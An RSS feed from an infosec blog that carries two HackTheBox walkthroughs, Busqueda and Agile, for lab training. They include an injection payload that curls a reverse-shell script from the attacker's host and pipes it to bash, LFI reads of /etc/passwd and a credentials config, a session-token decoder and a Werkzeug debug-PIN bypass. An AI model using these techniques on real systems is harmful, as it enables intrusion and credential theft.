<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-08-12T18:31:43+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Busqueda - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/busqueda.html" rel="alternate" type="text/html" title="Busqueda - HackTheBox" /><published>2023-08-12T00:00:00+01:00</published><updated>2023-08-12T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/busqueda</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/busqueda.html"><![CDATA[<p><strong>Busqueda</strong> is a nice easy linux machine on <em>HackTheBox</em>. It starts with a web application that’s vulnerable to <em>RCE</em>. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a <em>Gitea</em> instance. Privesc is by exploiting a custom script with sudo perms.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230812065633.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812065716.png" alt="" /></p>

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Mon Jul 31 06:51:57 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.208
Increasing send delay for 10.10.11.208 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Increasing send delay for 10.10.11.208 from 10 to 20 due to 11 out of 18 dropped probes since last increase.
Increasing send delay for 10.10.11.208 from 20 to 40 due to 11 out of 15 dropped probes since last increase.
Nmap scan report for 10.10.11.208
Host is up (0.50s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 31 06:53:07 2023 -- 1 IP address (1 host up) scanned in 70.24 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Server redirects to <code class="language-plaintext highlighter-rouge">searcher.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230812071854.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812072012.png" alt="" /></p>

<p>Site is running <em>Searchor v2.4.0</em>, which is available on <a href="https://github.com/ArjunSharda/Searchor">GitHub</a></p>

<p><img src="/assets/img/Pasted image 20230812072417.png" alt="" /></p>

<p>Entering a simple search term returns a link;</p>

<p><img src="/assets/img/Pasted image 20230812072919.png" alt="" /></p>

<p>The request made;</p>

<p><img src="/assets/img/Pasted image 20230812073004.png" alt="" /></p>

<p>When testing the <code class="language-plaintext highlighter-rouge">query</code> parameter, the endpoint is behaving differently whenever a single quote <code class="language-plaintext highlighter-rouge">'</code> is entered;</p>

<p><img src="/assets/img/Pasted image 20230812073232.png" alt="" /></p>

<p>Suspected SQL injection, but none of the usual payloads seems to work. I installed <em>Seachor</em> locally for testing;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.tar.gz
<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xvf</span> v2.4.0.tar.gz
<span class="nv">$ </span><span class="nb">cd </span>Searchor-2.4.0
<span class="nv">$ </span><span class="nb">sudo </span>python3 setup.py <span class="nb">install</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The README shows how the program is used. It has a module you can import and use in python, and also a CLI version. The module seems to handle single quotes well when called from a python REPL;</p>

<p><img src="/assets/img/Pasted image 20230812074023.png" alt="" /></p>

<p>However, the CLI tool provided gave an error;</p>

<p><img src="/assets/img/Pasted image 20230812074204.png" alt="" /></p>

<p>Notice how the <code class="language-plaintext highlighter-rouge">'</code> in the call to <code class="language-plaintext highlighter-rouge">Engine.Accuweather.Search</code> is not balanced, and we were able to escape the quotation. This indicates our query is injected directly into a python code used to call the library. Testing this, we got code execution;</p>

<p><img src="/assets/img/Pasted image 20230812074648.png" alt="" /></p>

<p>Testing on the box, I was unable to execute a bash rev shell directly. Had to curl it from my box, but it worked, and I got in as the user <code class="language-plaintext highlighter-rouge">svc</code>;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>engine=Accuweather&amp;query=',exec("import os; os.system('curl 10.10.16.10/rev.sh | /bin/bash')"),'
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230812075857.png" alt="" /></p>

<p>User flag was found in <code class="language-plaintext highlighter-rouge">~/user.txt</code></p>

<hr />
<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Can’t check sudo perms for <code class="language-plaintext highlighter-rouge">svc</code> as we still don’t have his password. <code class="language-plaintext highlighter-rouge">.gitconfig</code> file was found in the home directory, which is what is used to configure <code class="language-plaintext highlighter-rouge">git</code>;</p>

<p><img src="/assets/img/Pasted image 20230812080610.png" alt="" /></p>

<p>Checking the web app root dir at <code class="language-plaintext highlighter-rouge">/var/www/app</code> showed a <code class="language-plaintext highlighter-rouge">.git</code> folder, indicating it’s a GIT repo. Running <code class="language-plaintext highlighter-rouge">git status</code> prompted us to add the directory as <em>safe</em> for git;</p>

<p><img src="/assets/img/Pasted image 20230812081017.png" alt="" /></p>

<p>Notice from the output above the repo is in sync with <code class="language-plaintext highlighter-rouge">origin/main</code>, which indicates an upstream has been configured. Listing the remote origins, a cred was revealed;</p>

<p><img src="/assets/img/Pasted image 20230812081319.png" alt="" /></p>

<p>This is the same username that was found in <code class="language-plaintext highlighter-rouge">/home/svc/.gitconfig</code>. Testing the password on the account, I was able to login over SSH. <code class="language-plaintext highlighter-rouge">sudo -l</code> reveals a sudo perm on a custom script;</p>

<p><img src="/assets/img/Pasted image 20230812081749.png" alt="" /></p>

<p>However I do not have read perms on the file;</p>

<p><img src="/assets/img/Pasted image 20230812081836.png" alt="" /></p>

<p>Further enum showed a local <em>apache2</em> VHOST in <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>;</p>

<p><img src="/assets/img/Pasted image 20230812082355.png" alt="" /></p>

<p>I setup an SSH tunnel to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code>, and was able to access it through my browser;</p>

<p><img src="/assets/img/Pasted image 20230812082507.png" alt="" /></p>

<p>We already have the password of the <code class="language-plaintext highlighter-rouge">svc</code> user. Trying it on the Gitea instance didn’t work. But earlier we saw <code class="language-plaintext highlighter-rouge">svc</code> using the name <code class="language-plaintext highlighter-rouge">cody</code> in <code class="language-plaintext highlighter-rouge">.gitconfig</code>. Trying <code class="language-plaintext highlighter-rouge">cody:jh1usoih2bkjaspwe92</code> allowed me to login;</p>

<p><img src="/assets/img/Pasted image 20230812082917.png" alt="" /></p>

<p>Nothing of interest was found, except for the admin user;</p>

<p><img src="/assets/img/Pasted image 20230812082820.png" alt="" /></p>

<p>Going back to the sudo script, it accepts 3 arguments;</p>

<p><img src="/assets/img/Pasted image 20230812083106.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">docker-ps</code> showed 2 docker containers running;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 29 minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 29 minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">docker-inspect</code> allows us to supply a <em>format</em> and <em>container</em> name. This is interesting because docker has an <code class="language-plaintext highlighter-rouge">inspect</code> command used to pull info from containers if we can supply a custom Go template;</p>

<p><img src="/assets/img/Pasted image 20230812083759.png" alt="" /></p>

<p>Trying a template that will print the docker configuration of a container worked, and we got a new MySQL cred;</p>

<p><img src="/assets/img/Pasted image 20230812083954.png" alt="" /></p>

<p>Remember <code class="language-plaintext highlighter-rouge">docker-ps</code> showed port <code class="language-plaintext highlighter-rouge">3306</code> (MySQL) is forwarded to the <code class="language-plaintext highlighter-rouge">mysql_db</code> container on the box. Was able to login successfully and get the hash of <code class="language-plaintext highlighter-rouge">administrator</code>;</p>

<p><img src="/assets/img/Pasted image 20230812084621.png" alt="" /></p>

<p>No need to crack this though as the password used for the Gitea MySQL database is also the password of the user <code class="language-plaintext highlighter-rouge">administrator</code>, and we now have access to a repo containing the source code of the sudo scripts;</p>

<p><img src="/assets/img/Pasted image 20230812085220.png" alt="" /></p>

<p>Going through the source code of <code class="language-plaintext highlighter-rouge">system-checkup.py</code>, the script is calling <code class="language-plaintext highlighter-rouge">run_command()</code> with a relative path;</p>

<p><img src="/assets/img/Pasted image 20230812085520.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812085542.png" alt="" /></p>

<p>This makes the script vulnerable to arbitrary code execution as we could simply create a file in our current directory named <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> and it wil be executed;</p>

<p><img src="/assets/img/Pasted image 20230812090108.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230812090253.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">nmap</code> found port 22 (OpenSSH) and 80 (Apache2)</li>
  <li>Werkzeug web app that uses <code class="language-plaintext highlighter-rouge">Searchor v2.4.0</code> to run searches
    <ul>
      <li>Exploited an RCE bug to gain a shell as <code class="language-plaintext highlighter-rouge">svc</code></li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">svc</code>;
    <ul>
      <li>Got <code class="language-plaintext highlighter-rouge">user.txt</code></li>
      <li><code class="language-plaintext highlighter-rouge">sudo</code> perms configured, but no read access to the script.</li>
      <li>Found a cred for a git remote origin.</li>
      <li>Password was reused by user <code class="language-plaintext highlighter-rouge">cody</code> on local Gitea instance.</li>
      <li>Pulled Gitea <code class="language-plaintext highlighter-rouge">adminstrator</code> creds from docker config;
        <ul>
          <li>Found source code of the <code class="language-plaintext highlighter-rouge">sudo</code> script.</li>
          <li>Identified a relative call to a local script.</li>
          <li>Hijacked it to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="python" /><category term="werkzeug" /><category term="apache" /><category term="tunnel" /><category term="searchor" /><category term="gitea" /><category term="docker" /><category term="docker-inspect" /><summary type="html"><![CDATA[Busqueda is a nice easy linux machine on HackTheBox. It starts with a web application that’s vulnerable to RCE. Once on the box, you will find a GIT repo that has a cred in it’s remote origin config, which will give you access to a Gitea instance. Privesc is by exploiting a custom script with sudo perms.]]></summary></entry><entry><title type="html">Agile - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/agile.html" rel="alternate" type="text/html" title="Agile - HackTheBox" /><published>2023-08-05T00:00:00+01:00</published><updated>2023-08-05T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/agile</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/agile.html"><![CDATA[<p><strong>Agile</strong> is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the <em>Werkzeug</em> debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit <code class="language-plaintext highlighter-rouge">sudoedit</code> and a cron job that uses python’s virtualenv to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230324102949.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324103020.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Mar 15 06:47:26 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.203
Nmap scan report for agile (10.10.11.203)
Host is up (0.44s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 15 06:48:32 2023 -- 1 IP address (1 host up) scanned in 66.77 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Going to the web page redirected to <code class="language-plaintext highlighter-rouge">superpass.htb</code>, which I then added to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>

<p><img src="/assets/img/Pasted image 20230324103938.png" alt="" /></p>

<p>There is a <em>getting started</em> link at the bottom of the page, which redirect to a login form;</p>

<p><img src="/assets/img/Pasted image 20230324104049.png" alt="" /></p>

<p>Clicking the <em>register</em> button, I was able to create an account, and login;</p>

<p><img src="/assets/img/Pasted image 20230324104254.png" alt="" /></p>

<p>The application is a custom web-based password manager. Checking <em>burp</em>, the application issued us with a token following login;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>session=.eJwtjkuKwzAQRK8ieh0GtSRLap8i-yGEltQdG5wPlrMKuftoMauiqOLxPnDVjfsiHebfD5hjBNyld74JnOC8CXcx2_Nm1oc5noZrHaM5lrWb1_j8wOV7OQ3ILn2B-djfMtraYAas2VEkLllTLmhLyMlHL7lZVGIqNgVN0-QImwRfGjYUVinqY_UanNQYAmkNwgOktobJZVsc-ZgjVXLosXkXlDG1zIVIHDvbkFOzqQz967vL_m-T4PsHJgRGWg.ZB1wLQ.O5sxCFDdi0TGl0bQOQvJrPSjISE
</pre></td></tr></tbody></table></code></pre></div></div>

<p>That looked a bit like a JWT, but the algorithm part is missing. Attempting to base64-decode the payload part of the token failed, likely due to the the <code class="language-plaintext highlighter-rouge">-</code> and <code class="language-plaintext highlighter-rouge">_</code> symbols in the payload. Some encoders replace <code class="language-plaintext highlighter-rouge">+</code> and <code class="language-plaintext highlighter-rouge">/</code> with <code class="language-plaintext highlighter-rouge">-</code> and <code class="language-plaintext highlighter-rouge">_</code>, respectively. After replacing them, the payload decodes to a zlib-compressed data, which decompresses to a JSON object;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"_flashes"</span><span class="p">:[{</span><span class="nl">" t"</span><span class="p">:[</span><span class="s2">"message"</span><span class="p">,</span><span class="s2">"Please log in to access this page."</span><span class="p">]}],</span><span class="nl">"_fresh"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"1c82969ab8f78b10b487363e8d01f9a9b074f755291de43bd1d1eafebf36c3f42ec6449fc4ea296f0c45280b2936869c92131d324fa17d8ab99e2a20d1a7d07b"</span><span class="p">,</span><span class="nl">"_user_id"</span><span class="p">:</span><span class="s2">"17"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>So I wrote a simple script that, when given a token payload as an argument, decodes it, and when given a file, reads it as JSON and encode it;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">zlib</span><span class="p">,</span> <span class="n">base64</span>

<span class="k">def</span> <span class="nf">token_decode</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
  <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"-"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">)</span>
  <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"_"</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span>
  <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">token</span> <span class="o">+=</span> <span class="s">"="</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Base64: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">zlib</span><span class="p">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="n">wfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"token_data.json"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
  <span class="n">wfo</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="n">wfo</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] JSON: </span><span class="si">{</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">token_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">zlib</span><span class="p">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">())).</span><span class="n">decode</span><span class="p">()</span>
  <span class="k">while</span> <span class="n">data</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"="</span><span class="p">):</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span> <span class="s">"-"</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="s">"_"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Token: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="n">token</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
    <span class="n">token_encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="n">token_decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Multiple attempts to manipulate the token using this script failed, so I moved on.</p>

<p>The password manager has an option to <em>export</em> passwords in the vault, which generated a CSV file of passwords for download;</p>

<p><img src="/assets/img/Pasted image 20230324105930.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324110102.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">fn</code> parameter looks interesting. Testing it, it was found to be vulnerable to <em>Local File Inclusion (LFI)</em>;</p>

<p><img src="/assets/img/Pasted image 20230324110256.png" alt="" /></p>

<p>Giving the parameter an invalid file generated a detailed debug message that exposes the web app as a <em>Flask/Werkzeug</em> application. This indicate the server is running in debug mode. Going to the <code class="language-plaintext highlighter-rouge">/console</code> route (the default debug console route for Flask) however gave a <strong>404</strong> message;</p>

<p><img src="/assets/img/Pasted image 20230324110755.png" alt="" /></p>

<p>This is odd since the <strong>404</strong> page returned above differs with the ones returned by the server when requesting an invalid route;</p>

<p><img src="/assets/img/Pasted image 20230324110905.png" alt="" /></p>

<p>Hovering over a line in the debug error output showed a small terminal icon to the right;</p>

<p><img src="/assets/img/Pasted image 20230324111006.png" alt="" /></p>

<p>Clicking it prompted us for a debug pin, which we don’t have;</p>

<p><img src="/assets/img/Pasted image 20230324111020.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<h4 id="enumeration-using-lfi">Enumeration using LFI</h4>
<p><br /></p>

<p>Taking advantage of the LFI bug, and the debug error output, I was able to extract a lot from the system;</p>
<ul>
  <li><strong>4</strong> local users (<code class="language-plaintext highlighter-rouge">/etc/passwd</code>) - <em>corum</em>, <em>runner</em>, <em>edwards</em>, <em>dev_admin</em></li>
  <li>Hidden subdomain <code class="language-plaintext highlighter-rouge">test.superpass.htb</code> (<code class="language-plaintext highlighter-rouge">/etc/hosts</code>). Can’t access this domain from my box as it keeps redirecting to <code class="language-plaintext highlighter-rouge">superpass.htb</code>.</li>
  <li>Process command (<code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code>) - <code class="language-plaintext highlighter-rouge">/app/venv/bin/python3/app/venv/bin/gunicorn--bind127.0.0.1:5000--threads=10--timeout600wsgi:app</code></li>
  <li>Environment vars (<code class="language-plaintext highlighter-rouge">/proc/self/environ</code>) - <code class="language-plaintext highlighter-rouge">LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=9c2427940e444f78a89d7d86fde2dc58JOURNAL_STREAM=8:32855SYSTEMD_EXEC_PID=1090CONFIG_PATH=/app/config_prod.json</code>
    <ul>
      <li>MySQL creds in <code class="language-plaintext highlighter-rouge">/app/config_prod.json</code> - <code class="language-plaintext highlighter-rouge">superpassuser:dSA6l7q*yIVs$39Ml6ywvgK</code></li>
    </ul>
  </li>
  <li>Application entrypoint:  <code class="language-plaintext highlighter-rouge">/app/app/superpass/app.py</code>
    <ul>
      <li>From there traced all different parts of the app, and downloaded them for analysis.</li>
    </ul>
  </li>
</ul>

<p>The code responsible for the export and the LFI was found in <code class="language-plaintext highlighter-rouge">views/vault_views.py</code>;</p>

<p><img src="/assets/img/Pasted image 20230324112717.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">generate_csv()</code> function is defined in <code class="language-plaintext highlighter-rouge">services/password_service.py</code>;</p>

<p><img src="/assets/img/Pasted image 20230324112931.png" alt="" /></p>

<p>I thought of finding a way to access other users password exports if I could figure out how the random string appended to the exported filename is generated. The <code class="language-plaintext highlighter-rouge">get_random()</code> function used is defined in <code class="language-plaintext highlighter-rouge">services/utility_service.py</code>;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="k">def</span> <span class="nf">get_random</span><span class="p">(</span><span class="n">chars</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"SeCReT?!"</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="n">chars</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It looks pretty solid, so I moved on.</p>

<p><br /></p>

<h4 id="werkzeug-debug-console-pin">Werkzeug Debug Console PIN</h4>
<p><br /></p>

<p>Looking for possible ways to guess the console PIN, I found <a href="https://github.com/wdahlenburg/werkzeug-debug-console-bypass">this guide</a>. The README explains in great detail how to effectively guess the console PIN of a <em>Werkzeug</em> server provided you have an LFI on the host. I was able to get it to work after some tweaks.</p>

<p>The file <code class="language-plaintext highlighter-rouge">werkzeug-pin-bypass.py</code> has two arrays that need to be configured according to the target;</p>

<p><img src="/assets/img/Pasted image 20230324114021.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">probably_public_bits</code>;</p>
<ul>
  <li>The username is <code class="language-plaintext highlighter-rouge">www-data</code> in our case.</li>
  <li>The third item set to <code class="language-plaintext highlighter-rouge">Flask</code> is <code class="language-plaintext highlighter-rouge">wsgi_app</code> in our case. I found this by running the given command <code class="language-plaintext highlighter-rouge">getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> in a local instance of the web app. This seems to be the combination of the entrypoint file used by <code class="language-plaintext highlighter-rouge">gunicorn</code> (<code class="language-plaintext highlighter-rouge">wsgi.py</code>) and the web app entrypoint (<code class="language-plaintext highlighter-rouge">app.py</code>).</li>
  <li>Full path of Flask library - <code class="language-plaintext highlighter-rouge">/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">private_bits</code>;</p>
<ul>
  <li>Can’t run <code class="language-plaintext highlighter-rouge">uuid.getnode()</code> on the box obviously, and <code class="language-plaintext highlighter-rouge">/sys/class/net/ens33/address</code> does not exist. I read <code class="language-plaintext highlighter-rouge">/proc/self/net/addr</code> to get the interface the service is using, which was found to be <code class="language-plaintext highlighter-rouge">eth0</code>. Then I read <code class="language-plaintext highlighter-rouge">/sys/class/net/eth0/address</code> to get the address, which I converted to int. This value seems to have changed from when I first did the box, so you may need to regenerate.</li>
  <li>Looking at the other code given for generating machine ID, for this box it will be contents of <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> + <code class="language-plaintext highlighter-rouge">superpass.service</code> (from <code class="language-plaintext highlighter-rouge">/proc/self/cgroup</code>). This turn out to be <code class="language-plaintext highlighter-rouge">ed5b159560f54721827644bc9b220d00superpass.service</code></li>
</ul>

<p>Plugging all these parameters in, we got a PIN;</p>

<p><img src="/assets/img/Pasted image 20230324120542.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324120611.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324120640.png" alt="" /></p>

<p>Running the script gave me a PIN, and it was accepted by the server. I then used the python console to spawn a BASH reverse shell;</p>

